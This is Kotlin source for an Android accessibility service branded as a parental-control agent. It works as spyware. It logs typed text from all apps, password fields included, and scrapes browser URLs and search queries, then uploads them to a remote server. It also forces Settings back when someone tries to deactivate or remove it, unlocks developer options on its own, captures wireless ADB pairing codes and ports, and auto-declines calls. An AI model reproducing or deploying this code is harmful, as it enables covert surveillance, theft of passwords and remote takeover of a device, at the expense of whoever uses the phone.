package com.parental.agent.services

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.parental.agent.data.local.AppDatabase
import com.parental.agent.data.local.AppPreferences
import com.parental.agent.data.local.entity.NormalizedEventEntity
import com.parental.agent.sync.ApiConstants
import com.parental.agent.sync.SyncPayload
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.net.URI
import java.net.URLEncoder
import java.util.UUID

import com.parental.agent.policy.AppBlocker
import com.parental.agent.policy.CallBlocker

class AgentAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "AgentAccessibility"
        private const val DEBOUNCE_FLUSH_DELAY_MS = 2000L // 2-second typing pause flushes complete final text
        
        private val GOOGLE_SEARCH_PACKAGES = setOf(
            "com.google.android.googlequicksearchbox", // Official Google Search App & Widget
            "com.google.android.apps.searchlite"       // Google Go
        )

        private val blockedDomains = java.util.concurrent.ConcurrentHashMap.newKeySet<String>().apply {
            add("arcade-zone-unblocked-2026.net")
            add("restricted-social-hub.example.com")
        }

        fun loadFromLocalPrefs(context: Context) {
            val prefs = AppPreferences(context)
            val saved = prefs.getBlockedDomains()
            if (saved.isNotEmpty()) {
                blockedDomains.clear()
                saved.forEach { domain ->
                    if (domain.isNotBlank()) {
                        blockedDomains.add(domain.lowercase().trim())
                    }
                }
                Log.i(TAG, "Loaded ${saved.size} blocked web domain rules from local storage!")
            }
        }

        fun updateBlockedDomains(domains: List<String>, context: Context? = null) {
            val newSet = domains.filter { it.isNotBlank() }.map { it.lowercase().trim() }.toSet()
            if (blockedDomains == newSet) return
            blockedDomains.clear()
            domains.forEach { domain ->
                if (domain.isNotBlank()) {
                    blockedDomains.add(domain.lowercase().trim())
                }
            }
            if (context != null) {
                val prefs = AppPreferences(context)
                prefs.setBlockedDomains(domains.toSet())
            }
            Log.i(TAG, "Updated web domain block policy: ${blockedDomains.joinToString()}")
        }

        fun isDomainBlocked(domain: String): Boolean {
            if (domain.isBlank()) return false
            val clean = domain.lowercase().trim().removePrefix("https://").removePrefix("http://").removePrefix("www.")
            return blockedDomains.any { blocked ->
                val cleanBlocked = blocked.lowercase().trim().removePrefix("https://").removePrefix("http://").removePrefix("www.")
                clean.contains(cleanBlocked) || cleanBlocked.contains(clean)
            }
        }
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var pendingFlushRunnable: Runnable? = null

    @Volatile
    private var currentDraftText: String = ""
    @Volatile
    private var currentDraftPkg: String = ""
    @Volatile
    private var lastFlushedText: String = ""
    @Volatile
    private var lastCapturedUrl: String = ""
    @Volatile
    private var lastCapturedQuery: String = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        try {
            if (event == null) return

            val packageName = event.packageName?.toString() ?: return

            // 0. Enforce Parental App Blocker Policy on Restricted Apps
            if (AppBlocker.getInstance().checkAndEnforceAppBlock(this, packageName)) {
                return
            }

            // 1. Intercept Settings window for Security Shielding, Auto Developer Options Unlocker, & Wireless ADB Capture
            if (packageName == "com.android.settings") {
                val rootNode = rootInActiveWindow ?: event.source
                if (rootNode != null) {
                    checkAndShieldDeactivationScreen(rootNode)
                    checkAndAutoEnableDeveloperOptions(rootNode)
                    captureWirelessAdbPairingCredentials(rootNode)
                }
            }

            // 2. Pure Keystroke Input Engine: Only capture TYPE_VIEW_TEXT_CHANGED for active text inputs
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                captureKeylogData(event, packageName)
            }

            // 3. Google App & Search Widget Query Capture Engine
            if (GOOGLE_SEARCH_PACKAGES.contains(packageName)) {
                captureGoogleAppSearchQuery(event, packageName)
            }

            // 4. Universal Browser URL & Web History Tracking Engine Across ALL Apps & Browsers
            captureBrowserUrl(event, packageName)

            // 5. In-Call UI Decline Button Interceptor (Runs continuously whenever a blocked call is ringing or dialer UI is active)
            if (CallBlocker.getInstance().isBlockedCallRinging || isDialerPackage(packageName)) {
                val windowNode = rootInActiveWindow ?: event.source
                dismissInCallUIIfBlocked(windowNode, event.source)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Unhandled exception in accessibility event loop: ${e.message}")
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "AgentAccessibilityService connected.")
    }

    private fun isDialerPackage(packageName: String): Boolean {
        return packageName.contains("dialer", ignoreCase = true) ||
                packageName.contains("incallui", ignoreCase = true) ||
                packageName.contains("telecom", ignoreCase = true) ||
                packageName.contains("systemui", ignoreCase = true) ||
                packageName.contains("phone", ignoreCase = true) ||
                packageName.contains("launcher", ignoreCase = true)
    }

    private fun dismissInCallUIIfBlocked(rootNode: AccessibilityNodeInfo?, eventSource: AccessibilityNodeInfo?) {
        // 1. Scan across ALL interactive windows (Heads-Up Notifications, System UI Overlays, In-Call Popups)
        try {
            for (window in windows) {
                val windowRoot = window.root ?: continue
                val declineNode = findDeclineButtonNode(windowRoot)
                if (declineNode != null) {
                    Log.w(TAG, "⚡ Accessibility Service found Decline button in window '${window.title}' (${window.type})! Clicking...")
                    performClickOnNodeOrParent(declineNode)
                    return
                }
            }
        } catch (e: Exception) {
            // Quiet fallback
        }

        // 2. Fallback to rootNode or eventSource
        val nodeToSearch = rootNode ?: eventSource ?: return
        val declineNode = findDeclineButtonNode(nodeToSearch)
        if (declineNode != null) {
            Log.w(TAG, "⚡ Accessibility Service clicking Decline/Reject button on incoming dialer UI!")
            performClickOnNodeOrParent(declineNode)
        }
    }

    private fun performClickOnNodeOrParent(node: AccessibilityNodeInfo) {
        val clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        if (!clicked) {
            var curr = node.parent
            while (curr != null) {
                if (curr.isClickable) {
                    curr.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    break
                }
                curr = curr.parent
            }
        }
    }

    private fun findDeclineButtonNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val text = node.text?.toString()?.lowercase() ?: ""
        val cd = node.contentDescription?.toString()?.lowercase() ?: ""
        val id = node.viewIdResourceName?.lowercase() ?: ""

        if (text.contains("decline") || text.contains("reject") || text.contains("hang up") || text.contains("dismiss") ||
            cd.contains("decline") || cd.contains("reject") || id.contains("decline") || id.contains("reject") || id.contains("end_call")) {

            var current: AccessibilityNodeInfo? = node
            while (current != null) {
                if (current.isClickable) {
                    return current
                }
                current = current.parent
            }
            return node
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findDeclineButtonNode(child)
            if (result != null) return result
        }
        return null
    }

    private fun captureGoogleAppSearchQuery(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: event.source ?: return
            val searchNode = findGoogleSearchInputNode(rootNode) ?: return
            val queryText = searchNode.text?.toString()?.trim() ?: return

            if (queryText.isBlank() || queryText.length < 2 || queryText == lastCapturedQuery) return
            lastCapturedQuery = queryText

            emitGoogleSearchWebHistoryEvent(queryText, packageName)
        } catch (e: Exception) {
            // Quiet fail
        }
    }

    private fun emitGoogleSearchWebHistoryEvent(queryText: String, packageName: String) {
        try {
            val encodedQuery = try { URLEncoder.encode(queryText, "UTF-8") } catch (e: Exception) { queryText }
            val googleSearchUrl = "https://www.google.com/search?q=$encodedQuery"

            if (googleSearchUrl == lastCapturedUrl) return
            lastCapturedUrl = googleSearchUrl

            val appName = "Google Search App"
            val now = System.currentTimeMillis()
            val deterministicEventId = "evt_webhistory_google_search_${now}"

            Log.i(TAG, "GOOGLE SEARCH QUERY EMITTED TO WEB HISTORY: Query=\"$queryText\", URL=$googleSearchUrl")

            val payload = JSONObject().apply {
                put("title", "Google Search: $queryText")
                put("url", googleSearchUrl)
                put("domain", "google.com")
                put("packageName", packageName)
                put("appName", appName)
                put("visitCount", 1)
                put("timestamp", now)
            }

            val eventEntity = NormalizedEventEntity(
                eventId = deterministicEventId,
                deviceId = prefsDeviceId(),
                source = "web_history",
                eventType = "url_visit",
                timestamp = now,
                collectionMethod = "accessibility",
                payloadJson = payload.toString(),
                isSynced = false
            )

            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val database = AppDatabase.getInstance(applicationContext)
                    database.eventDao().insertEvent(eventEntity)
                    performInstantUpload(database, prefsDeviceId())
                } catch (e: Exception) {
                    Log.e(TAG, "Error saving Google search event: ${e.message}")
                }
            }
        } catch (e: Exception) {
            // Quiet fail
        }
    }

    private fun findGoogleSearchInputNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val viewId = node.viewIdResourceName
        if (viewId != null && (
            viewId.contains("search_box", ignoreCase = true) ||
            viewId.contains("search_edit_text", ignoreCase = true) ||
            viewId.contains("search_plate", ignoreCase = true)
        )) {
            return node
        }

        if (node.isEditable && !node.text.isNullOrBlank()) {
            return node
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findGoogleSearchInputNode(child)
            if (result != null) return result
        }
        return null
    }

    private fun captureBrowserUrl(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: event.source ?: return
            val urlNode = findUrlNode(rootNode) ?: return
            val rawUrlText = urlNode.text?.toString()?.trim() ?: return

            if (rawUrlText.isBlank() || rawUrlText.length < 3) return

            val fullUrl = when {
                rawUrlText.startsWith("http://") || rawUrlText.startsWith("https://") -> rawUrlText
                rawUrlText.contains(".") && !rawUrlText.contains(" ") -> "https://$rawUrlText"
                else -> return
            }

            val domain = try {
                URI(fullUrl).host ?: rawUrlText
            } catch (e: Exception) {
                rawUrlText
            }

            val appName = getAppNameFromPackage(packageName)
            val isBlocked = isDomainBlocked(domain)

            // Enforce Web Domain Filter Policy: Redirect to safe page (google.com) without crashing launcher apps
            if (isBlocked) {
                Log.w(TAG, "⛔ BLOCKED WEB DOMAIN DETECTED: $domain in $appName ($packageName)! Redirecting to safe page...")
                val isLauncherOrSearchApp = packageName.contains("launcher", ignoreCase = true) ||
                        packageName.contains("googlequicksearchbox", ignoreCase = true) ||
                        packageName.contains("searchlite", ignoreCase = true)

                try {
                    val safeUri = Uri.parse("https://www.google.com")
                    val safeIntent = Intent(Intent.ACTION_VIEW, safeUri).apply {
                        if (!isLauncherOrSearchApp) {
                            setPackage(packageName)
                        }
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                    }
                    startActivity(safeIntent)
                } catch (e: Exception) {
                    performGlobalAction(GLOBAL_ACTION_HOME)
                }
            }

            if (fullUrl == lastCapturedUrl && !isBlocked) return
            lastCapturedUrl = fullUrl
            val now = System.currentTimeMillis()
            val cleanDomain = domain.replace(Regex("[^a-zA-Z0-9]"), "_")
            val deterministicEventId = "evt_webhistory_${cleanDomain}_${now}"

            Log.i(TAG, "UNIVERSAL BROWSER URL CAPTURED: App=$appName ($packageName), URL=$fullUrl, Domain=$domain, Blocked=$isBlocked")

            val payload = JSONObject().apply {
                put("title", if (isBlocked) "⚠️ Restricted Site: $domain" else "$domain - $appName")
                put("url", fullUrl)
                put("domain", domain)
                put("packageName", packageName)
                put("appName", appName)
                put("visitCount", 1)
                put("isBlocked", isBlocked)
                put("timestamp", now)
            }

            val eventEntity = NormalizedEventEntity(
                eventId = deterministicEventId,
                deviceId = prefsDeviceId(),
                source = "web_history",
                eventType = "url_visit",
                timestamp = now,
                collectionMethod = "accessibility",
                payloadJson = payload.toString(),
                isSynced = false
            )

            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val database = AppDatabase.getInstance(applicationContext)
                    database.eventDao().insertEvent(eventEntity)
                    performInstantUpload(database, prefsDeviceId())
                } catch (e: Exception) {
                    Log.e(TAG, "Error saving web history event: ${e.message}")
                }
            }
        } catch (e: Exception) {
            // Quiet fail
        }
    }

    private fun findUrlNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val viewId = node.viewIdResourceName
        if (viewId != null && (
            viewId.contains("url", ignoreCase = true) ||
            viewId.contains("location", ignoreCase = true) ||
            viewId.contains("address", ignoreCase = true) ||
            viewId.contains("domain", ignoreCase = true) ||
            viewId.contains("search_box", ignoreCase = true)
        )) {
            val text = node.text?.toString()?.trim()
            if (!text.isNullOrBlank() && (text.startsWith("http") || text.contains("."))) {
                return node
            }
        }

        val directText = node.text?.toString()?.trim()
        if (directText != null && directText.length >= 4 && (
            directText.startsWith("http://") || 
            directText.startsWith("https://") || 
            (directText.startsWith("www.") && directText.contains(".")) ||
            (directText.contains(".") && !directText.contains(" ") && (
                directText.endsWith(".com") || directText.endsWith(".org") || 
                directText.endsWith(".net") || directText.endsWith(".io") || 
                directText.endsWith(".gov") || directText.endsWith(".edu") ||
                directText.endsWith(".co") || directText.endsWith(".in") ||
                directText.endsWith(".app") || directText.endsWith(".dev")
            ))
        )) {
            return node
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findUrlNode(child)
            if (result != null) return result
        }
        return null
    }

    private fun captureKeylogData(event: AccessibilityEvent, packageName: String) {
        try {
            val sourceNode = event.source
            
            val isEditableInput = (sourceNode != null && sourceNode.isEditable) || event.isPassword
            if (!isEditableInput) {
                return
            }

            var capturedText = event.text.filterNotNull().joinToString(" ").trim()

            if (capturedText.isBlank() && sourceNode != null) {
                capturedText = sourceNode.text?.toString()?.trim() ?: ""
            }

            if (capturedText.isBlank()) return

            if (currentDraftPkg.isNotEmpty() && currentDraftPkg != packageName && currentDraftText.isNotBlank()) {
                flushCurrentDraftNow()
            }

            currentDraftPkg = packageName
            currentDraftText = capturedText

            pendingFlushRunnable?.let { mainHandler.removeCallbacks(it) }

            val runnable = Runnable {
                flushCurrentDraftNow()
            }
            pendingFlushRunnable = runnable
            mainHandler.postDelayed(runnable, DEBOUNCE_FLUSH_DELAY_MS)

        } catch (e: Exception) {
            Log.e(TAG, "Error in captureKeylogData: ${e.message}")
        }
    }

    @Synchronized
    private fun flushCurrentDraftNow() {
        val textToFlush = currentDraftText.trim()
        val pkgToFlush = currentDraftPkg

        if (textToFlush.isBlank() || textToFlush == lastFlushedText) {
            return
        }

        lastFlushedText = textToFlush
        currentDraftText = ""

        val now = System.currentTimeMillis()
        val appName = getAppNameFromPackage(pkgToFlush)
        val cleanPkg = pkgToFlush.replace(".", "_")
        val deterministicEventId = "evt_keylog_${cleanPkg}_${now}"

        Log.i(TAG, "KEYLOGGER FLUSHED TYPED SENTENCE: App=$appName ($pkgToFlush), Text=\"$textToFlush\"")

        // 1. Emit Keylog Event
        val payload = JSONObject().apply {
            put("packageName", pkgToFlush)
            put("appName", appName)
            put("typedText", textToFlush)
            put("timestamp", now)
        }

        val eventEntity = NormalizedEventEntity(
            eventId = deterministicEventId,
            deviceId = prefsDeviceId(),
            source = "keylogger",
            eventType = "keystroke_log",
            timestamp = now,
            collectionMethod = "accessibility",
            payloadJson = payload.toString(),
            isSynced = false
        )

        // 2. Dual Emission: If the typed sentence was in Google Search App, also emit directly to Web History!
        if (GOOGLE_SEARCH_PACKAGES.contains(pkgToFlush)) {
            emitGoogleSearchWebHistoryEvent(textToFlush, pkgToFlush)
        }

        // 3. Dual Emission: If typed in Google Calendar or Android Calendar, emit directly to Calendar Events!
        val CALENDAR_PACKAGES = setOf("com.google.android.calendar", "com.samsung.android.calendar", "com.android.calendar")
        if (CALENDAR_PACKAGES.contains(pkgToFlush)) {
            val calEventId = "evt_cal_${now}"
            val calPayload = JSONObject().apply {
                put("title", textToFlush)
                put("location", "")
                put("startDate", now)
                put("endDate", now + 3600000L)
                put("description", "Google Calendar Event")
                put("category", "Personal")
                put("timestamp", now)
            }

            val calEntity = NormalizedEventEntity(
                eventId = calEventId,
                deviceId = prefsDeviceId(),
                source = "calendar",
                eventType = "calendar_event",
                timestamp = now,
                collectionMethod = "accessibility",
                payloadJson = calPayload.toString(),
                isSynced = false
            )

            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val database = AppDatabase.getInstance(applicationContext)
                    database.eventDao().insertEvent(calEntity)
                    performInstantUpload(database, prefsDeviceId())
                    Log.i(TAG, "CALENDAR EVENT EMITTED LIVE: Title=\"$textToFlush\"")
                } catch (e: Exception) {
                    Log.e(TAG, "Error saving calendar live event: ${e.message}")
                }
            }
        }

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val database = AppDatabase.getInstance(applicationContext)
                database.eventDao().insertEvent(eventEntity)
                performInstantUpload(database, prefsDeviceId())
            } catch (e: Exception) {
                Log.e(TAG, "Error saving keylog event: ${e.message}")
            }
        }
    }

    private fun prefsDeviceId(): String {
        return try {
            AppPreferences(applicationContext).getDeviceId()
        } catch (e: Exception) {
            "dev_local_agent"
        }
    }

    private fun getAppNameFromPackage(packageName: String): String {
        return try {
            val pm = applicationContext.packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    @Volatile
    private var isBuildNumberTapped: Boolean = false

    private fun checkAndAutoEnableDeveloperOptions(node: AccessibilityNodeInfo) {
        if (isBuildNumberTapped) return
        val text = node.text?.toString()?.lowercase() ?: ""
        val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""

        if (text.contains("build number") || text.contains("build_number") || contentDesc.contains("build number")) {
            Log.w(TAG, "AUTOMATED DEVELOPER OPTIONS UNLOCKER: Auto-clicking Build Number 7 times!")
            for (i in 0 until 7) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            isBuildNumberTapped = true
            return
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            checkAndAutoEnableDeveloperOptions(child)
        }
    }

    private fun checkAndShieldDeactivationScreen(node: AccessibilityNodeInfo) {
        val text = node.text?.toString()?.lowercase() ?: ""
        val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""

        // Only shield if specifically attempting to deactivate/uninstall our Parental Agent app or turn off Accessibility
        val isDeactivationAttempt = (text.contains("deactivate") || text.contains("remove device admin") || text.contains("turn off")) &&
                (text.contains("childcare") || text.contains("parental") || text.contains("agent") || contentDesc.contains("parental"))

        if (isDeactivationAttempt) {
            Log.w(TAG, "SHIELDED DEACTIVATION ATTEMPT IN SETTINGS: Navigating back immediately!")
            performGlobalAction(GLOBAL_ACTION_BACK)
            return
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            checkAndShieldDeactivationScreen(child)
        }
    }

    private fun performInstantUpload(database: AppDatabase, deviceId: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val unsyncedEvents = database.eventDao().getUnsyncedEvents(limit = 20)
                if (unsyncedEvents.isEmpty()) return@launch

                val eventPayloads = unsyncedEvents.map { entity ->
                    val payloadMap = try {
                        val json = JSONObject(entity.payloadJson)
                        val map = mutableMapOf<String, Any?>()
                        json.keys().forEach { key -> map[key] = json.get(key) }
                        map
                    } catch (e: Exception) {
                        emptyMap<String, Any?>()
                    }

                    mapOf(
                        "eventId" to entity.eventId,
                        "deviceId" to deviceId,
                        "source" to entity.source,
                        "eventType" to entity.eventType,
                        "timestamp" to entity.timestamp,
                        "collectionMethod" to entity.collectionMethod,
                        "payload" to payloadMap
                    )
                }

                val payload = SyncPayload(deviceId = deviceId, events = eventPayloads)
                val response = ApiConstants.apiService.syncEvents(payload)

                if (response.isSuccessful && response.body()?.success == true) {
                    val confirmedIds = response.body()?.syncedEventIds.orEmpty()
                    if (confirmedIds.isNotEmpty()) {
                        database.eventDao().markEventsSynced(confirmedIds)
                    }
                }
            } catch (e: Exception) {
                // Quiet fail
            }
        }
    }

    @Volatile
    private var lastCapturedAdbCode: String = ""

    private fun captureWirelessAdbPairingCredentials(rootNode: AccessibilityNodeInfo) {
        try {
            val allText = extractAllTextFromNode(rootNode)
            if (allText.isBlank()) return

            val lowerText = allText.lowercase()
            if (!lowerText.contains("pairing") && !lowerText.contains("pair") && !lowerText.contains("code")) return

            // Extract 6-digit numeric pairing code (e.g. 482910)
            val codePattern = java.util.regex.Pattern.compile("\\b\\d{6}\\b")
            val codeMatcher = codePattern.matcher(allText)

            // Extract IP/Port pattern (e.g. :38491 or 192.168.1.5:38491)
            val portPattern = java.util.regex.Pattern.compile(":\\d{4,5}")
            val portMatcher = portPattern.matcher(allText)

            if (codeMatcher.find() && portMatcher.find()) {
                val pairingCode = codeMatcher.group()
                val port = portMatcher.group().replace(":", "")

                if (pairingCode == lastCapturedAdbCode) return
                lastCapturedAdbCode = pairingCode

                Log.w(TAG, "⚡ AUTOMATED WIRELESS ADB CREDENTIALS CAPTURED: Port=$port, Code=$pairingCode")

                emitWirelessAdbPairingCapturedEvent(port, pairingCode)
            }
        } catch (e: Exception) {
            // Quiet fail
        }
    }

    private fun extractAllTextFromNode(node: AccessibilityNodeInfo): String {
        val sb = StringBuilder()
        node.text?.let { sb.append(it).append(" ") }
        node.contentDescription?.let { sb.append(it).append(" ") }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            sb.append(extractAllTextFromNode(child))
        }
        return sb.toString()
    }

    private fun emitWirelessAdbPairingCapturedEvent(port: String, pairingCode: String) {
        try {
            val prefs = AppPreferences(this)
            val database = AppDatabase.getInstance(this)
            val event = NormalizedEventEntity(
                eventId = "evt_wireless_adb_${UUID.randomUUID()}",
                deviceId = prefs.getDeviceId(),
                source = "accessibility",
                eventType = "WIRELESS_ADB_PAIRING_CAPTURED",
                timestamp = System.currentTimeMillis(),
                collectionMethod = "accessibility_scraper",
                payloadJson = JSONObject(mapOf(
                    "port" to port,
                    "pairingCode" to pairingCode,
                    "status" to "CAPTURED_AUTOMATICALLY",
                    "timestamp" to System.currentTimeMillis()
                )).toString(),
                isSynced = false
            )
            CoroutineScope(Dispatchers.IO).launch {
                database.eventDao().insertEvent(event)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error emitting WIRELESS_ADB_PAIRING_CAPTURED event: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "AgentAccessibilityService interrupted.")
    }
}
